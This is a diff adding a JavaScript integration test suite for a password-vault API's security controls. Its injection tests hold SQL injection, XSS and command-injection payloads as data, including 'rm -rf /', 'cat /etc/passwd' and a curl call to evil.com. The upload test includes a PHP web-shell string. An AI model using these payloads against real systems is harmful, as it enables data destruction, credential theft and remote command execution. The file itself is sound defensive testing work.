@@ -1,0 +1,664 @@
+/**
+ * API Security Integration Tests
+ * Comprehensive security testing for all API endpoints
+ */
+
+const request = require('supertest');
+const app = require('../../src/app');
+const database = require('../../src/config/database');
+const jwt = require('jsonwebtoken');
+const { CryptoService } = require('../../src/services/cryptoService');
+
+describe('API Security Tests', () => {
+  let testUser;
+  let authToken;
+  let refreshToken;
+  let expiredToken;
+  let malformedToken;
+  let cryptoService;
+
+  beforeAll(async () => {
+    await database.connect();
+    cryptoService = new CryptoService();
+  });
+
+  afterAll(async () => {
+    await database.close();
+  });
+
+  beforeEach(async () => {
+    // Clean up test data
+    const client = await database.getClient();
+    await client.query('DELETE FROM users WHERE email LIKE $1', ['%security-test%']);
+    await client.release();
+
+    // Create test user
+    const password = 'SecureTest123!';
+    const hashedPassword = await cryptoService.hashPassword(password);
+    
+    const client2 = await database.getClient();
+    const result = await client2.query(
+      `INSERT INTO users (email, password_hash, name, role, email_verified) 
+       VALUES ($1, $2, $3, $4, $5) RETURNING *`,
+      ['security-test@example.com', hashedPassword, 'Security Test', 'user', true]
+    );
+    testUser = result.rows[0];
+    await client2.release();
+
+    // Generate tokens
+    authToken = jwt.sign(
+      { userId: testUser.id, email: testUser.email },
+      process.env.JWT_SECRET,
+      { expiresIn: '1h' }
+    );
+
+    refreshToken = jwt.sign(
+      { userId: testUser.id, type: 'refresh' },
+      process.env.JWT_REFRESH_SECRET,
+      { expiresIn: '7d' }
+    );
+
+    expiredToken = jwt.sign(
+      { userId: testUser.id, email: testUser.email },
+      process.env.JWT_SECRET,
+      { expiresIn: '-1h' }
+    );
+
+    malformedToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature';
+  });
+
+  afterEach(async () => {
+    const client = await database.getClient();
+    await client.query('DELETE FROM users WHERE id = $1', [testUser.id]);
+    await client.release();
+  });
+
+  describe('Authentication Tests', () => {
+    test('should reject requests without authentication token', async () => {
+      const response = await request(app)
+        .get('/api/vault/entries')
+        .expect(401);
+
+      expect(response.body.error).toContain('authentication');
+    });
+
+    test('should reject requests with expired token', async () => {
+      const response = await request(app)
+        .get('/api/vault/entries')
+        .set('Authorization', `Bearer ${expiredToken}`)
+        .expect(401);
+
+      expect(response.body.error).toContain('expired');
+    });
+
+    test('should reject requests with malformed token', async () => {
+      const response = await request(app)
+        .get('/api/vault/entries')
+        .set('Authorization', `Bearer ${malformedToken}`)
+        .expect(401);
+
+      expect(response.body.error).toContain('invalid');
+    });
+
+    test('should reject requests with invalid signature', async () => {
+      const invalidToken = jwt.sign(
+        { userId: testUser.id, email: testUser.email },
+        'wrong-secret',
+        { expiresIn: '1h' }
+      );
+
+      const response = await request(app)
+        .get('/api/vault/entries')
+        .set('Authorization', `Bearer ${invalidToken}`)
+        .expect(401);
+
+      expect(response.body.error).toBeDefined();
+    });
+
+    test('should handle token refresh correctly', async () => {
+      const response = await request(app)
+        .post('/api/auth/refresh')
+        .send({ refreshToken })
+        .expect(200);
+
+      expect(response.body.accessToken).toBeDefined();
+      expect(response.body.refreshToken).toBeDefined();
+      
+      // New token should work
+      const testResponse = await request(app)
+        .get('/api/vault/entries')
+        .set('Authorization', `Bearer ${response.body.accessToken}`)
+        .expect(200);
+    });
+
+    test('should prevent token replay attacks', async () => {
+      // Use refresh token
+      const response1 = await request(app)
+        .post('/api/auth/refresh')
+        .send({ refreshToken })
+        .expect(200);
+
+      // Try to use same refresh token again
+      const response2 = await request(app)
+        .post('/api/auth/refresh')
+        .send({ refreshToken })
+        .expect(401);
+
+      expect(response2.body.error).toContain('invalid');
+    });
+  });
+
+  describe('Authorization Tests', () => {
+    test('should prevent access to other users resources', async () => {
+      // Create another user's vault entry
+      const client = await database.getClient();
+      const otherUser = await client.query(
+        `INSERT INTO users (email, password_hash, name, role, email_verified) 
+         VALUES ($1, $2, $3, $4, $5) RETURNING id`,
+        ['other-user@example.com', 'hash', 'Other User', 'user', true]
+      );
+      
+      const otherUserId = otherUser.rows[0].id;
+      
+      const vaultEntry = await client.query(
+        `INSERT INTO vault_entries (user_id, category, encrypted_data) 
+         VALUES ($1, $2, $3) RETURNING id`,
+        [otherUserId, 'login', { title: 'encrypted' }]
+      );
+      
+      const entryId = vaultEntry.rows[0].id;
+      await client.release();
+
+      // Try to access other user's entry
+      const response = await request(app)
+        .get(`/api/vault/entries/${entryId}`)
+        .set('Authorization', `Bearer ${authToken}`)
+        .expect(403);
+
+      expect(response.body.error).toContain('forbidden');
+
+      // Clean up
+      const client2 = await database.getClient();
+      await client2.query('DELETE FROM vault_entries WHERE id = $1', [entryId]);
+      await client2.query('DELETE FROM users WHERE id = $1', [otherUserId]);
+      await client2.release();
+    });
+
+    test('should enforce role-based access control', async () => {
+      // Try to access admin endpoint as regular user
+      const response = await request(app)
+        .get('/api/admin/users')
+        .set('Authorization', `Bearer ${authToken}`)
+        .expect(403);
+
+      expect(response.body.error).toContain('permission');
+    });
+
+    test('should validate resource ownership', async () => {
+      // Create vault entry for test user
+      const client = await database.getClient();
+      const entry = await client.query(
+        `INSERT INTO vault_entries (user_id, category, encrypted_data) 
+         VALUES ($1, $2, $3) RETURNING id`,
+        [testUser.id, 'login', { title: 'encrypted' }]
+      );
+      const entryId = entry.rows[0].id;
+      await client.release();
+
+      // Should allow access to own entry
+      const response = await request(app)
+        .get(`/api/vault/entries/${entryId}`)
+        .set('Authorization', `Bearer ${authToken}`)
+        .expect(200);
+
+      expect(response.body.data.id).toBe(entryId);
+
+      // Clean up
+      const client2 = await database.getClient();
+      await client2.query('DELETE FROM vault_entries WHERE id = $1', [entryId]);
+      await client2.release();
+    });
+  });
+
+  describe('Input Validation & Injection Prevention', () => {
+    test('should prevent SQL injection in query parameters', async () => {
+      const sqlInjectionAttempts = [
+        "'; DROP TABLE users; --",
+        "1' OR '1'='1",
+        "admin'--",
+        "' UNION SELECT * FROM users--"
+      ];
+
+      for (const attempt of sqlInjectionAttempts) {
+        const response = await request(app)
+          .get('/api/vault/entries')
+          .query({ search: attempt })
+          .set('Authorization', `Bearer ${authToken}`);
+
+        // Should not cause error, just return empty or filtered results
+        expect(response.status).toBeLessThan(500);
+        
+        // Verify database is still intact
+        const client = await database.getClient();
+        const tables = await client.query(
+          "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'"
+        );
+        await client.release();
+        
+        expect(tables.rows.some(t => t.table_name === 'users')).toBe(true);
+      }
+    });
+
+    test('should prevent XSS in user input', async () => {
+      const xssAttempts = [
+        '<script>alert("XSS")</script>',
+        'javascript:alert("XSS")',
+        '<img src=x onerror="alert(\'XSS\')">',
+        '<iframe src="javascript:alert(\'XSS\')"></iframe>'
+      ];
+
+      for (const attempt of xssAttempts) {
+        const response = await request(app)
+          .post('/api/vault/entries')
+          .set('Authorization', `Bearer ${authToken}`)
+          .send({
+            category: 'note',
+            encryptedData: {
+              title: attempt,
+              content: attempt
+            }
+          });
+
+        if (response.status === 201) {
+          // Check that data is properly escaped/sanitized
+          expect(response.body.data.encryptedData.title).not.toContain('<script>');
+          expect(response.body.data.encryptedData.title).not.toContain('javascript:');
+        }
+      }
+    });
+
+    test('should validate and sanitize JSON input', async () => {
+      const malformedJson = [
+        '{"key": undefined}',
+        '{"key": NaN}',
+        '{"key": Infinity}'
+      ];
+
+      for (const json of malformedJson) {
+        const response = await request(app)
+          .post('/api/vault/entries')
+          .set('Authorization', `Bearer ${authToken}`)
+          .set('Content-Type', 'application/json')
+          .send(json);
+
+        expect(response.status).toBeGreaterThanOrEqual(400);
+        expect(response.body.error).toBeDefined();
+      }
+    });
+
+    test('should prevent command injection', async () => {
+      const commandInjectionAttempts = [
+        '; rm -rf /',
+        '| cat /etc/passwd',
+        '`whoami`',
+        '$(curl evil.com)'
+      ];
+
+      for (const attempt of commandInjectionAttempts) {
+        const response = await request(app)
+          .post('/api/vault/entries')
+          .set('Authorization', `Bearer ${authToken}`)
+          .send({
+            category: 'note',
+            encryptedData: {
+              title: attempt
+            }
+          });
+
+        // Should handle safely
+        expect(response.status).toBeLessThan(500);
+      }
+    });
+
+    test('should enforce input length limits', async () => {
+      const oversizedData = {
+        category: 'note',
+        encryptedData: {
+          title: 'a'.repeat(10000),
+          content: 'b'.repeat(1000000)
+        }
+      };
+
+      const response = await request(app)
+        .post('/api/vault/entries')
+        .set('Authorization', `Bearer ${authToken}`)
+        .send(oversizedData)
+        .expect(400);
+
+      expect(response.body.error).toContain('too large');
+    });
+  });
+
+  describe('CSRF Protection', () => {
+    test('should require CSRF token for state-changing operations', async () => {
+      // Get CSRF token
+      const tokenResponse = await request(app)
+        .get('/api/auth/csrf')
+        .set('Authorization', `Bearer ${authToken}`)
+        .expect(200);
+
+      const csrfToken = tokenResponse.body.token;
+
+      // Request without CSRF token should fail
+      const response1 = await request(app)
+        .post('/api/vault/entries')
+        .set('Authorization', `Bearer ${authToken}`)
+        .send({
+          category: 'login',
+          encryptedData: { title: 'test' }
+        })
+        .expect(403);
+
+      expect(response1.body.error).toContain('CSRF');
+
+      // Request with CSRF token should succeed
+      const response2 = await request(app)
+        .post('/api/vault/entries')
+        .set('Authorization', `Bearer ${authToken}`)
+        .set('X-CSRF-Token', csrfToken)
+        .send({
+          category: 'login',
+          encryptedData: { title: 'test' }
+        });
+
+      expect(response2.status).toBeLessThan(400);
+    });
+
+    test('should validate CSRF token origin', async () => {
+      const fakeToken = 'fake-csrf-token';
+
+      const response = await request(app)
+        .post('/api/vault/entries')
+        .set('Authorization', `Bearer ${authToken}`)
+        .set('X-CSRF-Token', fakeToken)
+        .send({
+          category: 'login',
+          encryptedData: { title: 'test' }
+        })
+        .expect(403);
+
+      expect(response.body.error).toContain('invalid');
+    });
+  });
+
+  describe('Rate Limiting', () => {
+    test('should rate limit authentication attempts', async () => {
+      const attempts = [];
+      
+      // Make multiple rapid login attempts
+      for (let i = 0; i < 10; i++) {
+        attempts.push(
+          request(app)
+            .post('/api/auth/login')
+            .send({
+              email: 'test@example.com',
+              password: 'wrong'
+            })
+        );
+      }
+
+      const responses = await Promise.all(attempts);
+      const rateLimited = responses.filter(r => r.status === 429);
+      
+      expect(rateLimited.length).toBeGreaterThan(0);
+      expect(rateLimited[0].body.error).toContain('rate limit');
+    });
+
+    test('should rate limit per IP address', async () => {
+      const attempts = [];
+      
+      // Simulate requests from same IP
+      for (let i = 0; i < 20; i++) {
+        attempts.push(
+          request(app)
+            .get('/api/vault/entries')
+            .set('Authorization', `Bearer ${authToken}`)
+            .set('X-Forwarded-For', '192.168.1.100')
+        );
+      }
+
+      const responses = await Promise.all(attempts);
+      const rateLimited = responses.filter(r => r.status === 429);
+      
+      expect(rateLimited.length).toBeGreaterThan(0);
+    });
+
+    test('should rate limit per user', async () => {
+      const attempts = [];
+      
+      // Make multiple rapid requests
+      for (let i = 0; i < 100; i++) {
+        attempts.push(
+          request(app)
+            .get('/api/vault/entries')
+            .set('Authorization', `Bearer ${authToken}`)
+        );
+      }
+
+      const responses = await Promise.all(attempts);
+      const rateLimited = responses.filter(r => r.status === 429);
+      
+      expect(rateLimited.length).toBeGreaterThan(0);
+    });
+  });
+
+  describe('CORS Configuration', () => {
+    test('should allow requests from whitelisted origins', async () => {
+      const response = await request(app)
+        .get('/api/vault/entries')
+        .set('Authorization', `Bearer ${authToken}`)
+        .set('Origin', process.env.FRONTEND_URL)
+        .expect(200);
+
+      expect(response.headers['access-control-allow-origin']).toBe(process.env.FRONTEND_URL);
+    });
+
+    test('should block requests from non-whitelisted origins', async () => {
+      const response = await request(app)
+        .get('/api/vault/entries')
+        .set('Authorization', `Bearer ${authToken}`)
+        .set('Origin', 'https://evil.com');
+
+      expect(response.headers['access-control-allow-origin']).not.toBe('https://evil.com');
+    });
+
+    test('should handle preflight requests correctly', async () => {
+      const response = await request(app)
+        .options('/api/vault/entries')
+        .set('Origin', process.env.FRONTEND_URL)
+        .set('Access-Control-Request-Method', 'POST')
+        .set('Access-Control-Request-Headers', 'content-type,authorization')
+        .expect(204);
+
+      expect(response.headers['access-control-allow-methods']).toContain('POST');
+      expect(response.headers['access-control-allow-headers']).toContain('authorization');
+    });
+  });
+
+  describe('Security Headers', () => {
+    test('should set security headers correctly', async () => {
+      const response = await request(app)
+        .get('/api/vault/entries')
+        .set('Authorization', `Bearer ${authToken}`)
+        .expect(200);
+
+      expect(response.headers['x-content-type-options']).toBe('nosniff');
+      expect(response.headers['x-frame-options']).toBe('DENY');
+      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
+      expect(response.headers['strict-transport-security']).toContain('max-age=');
+      expect(response.headers['content-security-policy']).toBeDefined();
+    });
+
+    test('should not expose sensitive information in headers', async () => {
+      const response = await request(app)
+        .get('/api/vault/entries')
+        .set('Authorization', `Bearer ${authToken}`)
+        .expect(200);
+
+      expect(response.headers['x-powered-by']).toBeUndefined();
+      expect(response.headers['server']).not.toContain('Express');
+    });
+  });
+
+  describe('File Upload Security', () => {
+    test('should validate file types', async () => {
+      const response = await request(app)
+        .post('/api/user/avatar')
+        .set('Authorization', `Bearer ${authToken}`)
+        .attach('file', Buffer.from('fake exe content'), 'malware.exe')
+        .expect(400);
+
+      expect(response.body.error).toContain('file type');
+    });
+
+    test('should enforce file size limits', async () => {
+      const largeFile = Buffer.alloc(10 * 1024 * 1024); // 10MB
+      
+      const response = await request(app)
+        .post('/api/user/avatar')
+        .set('Authorization', `Bearer ${authToken}`)
+        .attach('file', largeFile, 'large.jpg')
+        .expect(400);
+
+      expect(response.body.error).toContain('too large');
+    });
+
+    test('should scan for malicious content', async () => {
+      // Simulate malicious file content
+      const maliciousContent = Buffer.from('<?php system($_GET["cmd"]); ?>');
+      
+      const response = await request(app)
+        .post('/api/user/avatar')
+        .set('Authorization', `Bearer ${authToken}`)
+        .attach('file', maliciousContent, 'image.jpg')
+        .expect(400);
+
+      expect(response.body.error).toContain('security');
+    });
+  });
+
+  describe('API Key Management', () => {
+    test('should generate secure API keys', async () => {
+      const response = await request(app)
+        .post('/api/user/api-keys')
+        .set('Authorization', `Bearer ${authToken}`)
+        .send({ name: 'Test API Key' })
+        .expect(201);
+
+      expect(response.body.apiKey).toBeDefined();
+      expect(response.body.apiKey).toMatch(/^[A-Za-z0-9+/]{32,}$/);
+    });
+
+    test('should authenticate with API key', async () => {
+      // Generate API key
+      const keyResponse = await request(app)
+        .post('/api/user/api-keys')
+        .set('Authorization', `Bearer ${authToken}`)
+        .send({ name: 'Test Key' })
+        .expect(201);
+
+      const apiKey = keyResponse.body.apiKey;
+
+      // Use API key for authentication
+      const response = await request(app)
+        .get('/api/vault/entries')
+        .set('X-API-Key', apiKey)
+        .expect(200);
+
+      expect(response.body.data).toBeDefined();
+    });
+
+    test('should revoke API keys', async () => {
+      // Generate API key
+      const keyResponse = await request(app)
+        .post('/api/user/api-keys')
+        .set('Authorization', `Bearer ${authToken}`)
+        .send({ name: 'Test Key' })
+        .expect(201);
+
+      const apiKey = keyResponse.body.apiKey;
+      const keyId = keyResponse.body.id;
+
+      // Revoke key
+      await request(app)
+        .delete(`/api/user/api-keys/${keyId}`)
+        .set('Authorization', `Bearer ${authToken}`)
+        .expect(200);
+
+      // Try to use revoked key
+      const response = await request(app)
+        .get('/api/vault/entries')
+        .set('X-API-Key', apiKey)
+        .expect(401);
+
+      expect(response.body.error).toContain('invalid');
+    });
+  });
+
+  describe('Session Security', () => {
+    test('should invalidate sessions on logout', async () => {
+      // Login
+      const loginResponse = await request(app)
+        .post('/api/auth/login')
+        .send({
+          email: 'security-test@example.com',
+          password: 'SecureTest123!'
+        })
+        .expect(200);
+
+      const sessionToken = loginResponse.body.token;
+
+      // Logout
+      await request(app)
+        .post('/api/auth/logout')
+        .set('Authorization', `Bearer ${sessionToken}`)
+        .expect(200);
+
+      // Try to use logged out session
+      const response = await request(app)
+        .get('/api/vault/entries')
+        .set('Authorization', `Bearer ${sessionToken}`)
+        .expect(401);
+
+      expect(response.body.error).toContain('invalid');
+    });
+
+    test('should prevent session fixation attacks', async () => {
+      // Get initial session
+      const response1 = await request(app)
+        .get('/api/auth/session')
+        .expect(200);
+
+      const sessionId1 = response1.body.sessionId;
+
+      // Login
+      const loginResponse = await request(app)
+        .post('/api/auth/login')
+        .send({
+          email: 'security-test@example.com',
+          password: 'SecureTest123!'
+        })
+        .expect(200);
+
+      // Session ID should change after login
+      const response2 = await request(app)
+        .get('/api/auth/session')
+        .set('Authorization', `Bearer ${loginResponse.body.token}`)
+        .expect(200);
+
+      const sessionId2 = response2.body.sessionId;
+      
+      expect(sessionId2).not.toBe(sessionId1);
+    });
+  });
+});
